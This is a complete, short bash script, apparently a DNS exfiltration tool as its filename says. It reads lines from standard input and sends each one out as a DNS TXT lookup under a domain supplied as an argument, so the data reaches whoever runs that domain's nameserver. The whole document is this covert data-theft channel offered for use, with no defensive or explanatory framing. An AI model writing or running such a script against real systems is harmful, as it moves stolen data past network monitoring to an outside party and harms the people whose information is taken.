#!/bin/bash
# Usage: ./dns_exfil_tools.sh <domain>
while read line; do
    dig +short txt $line.$1
done
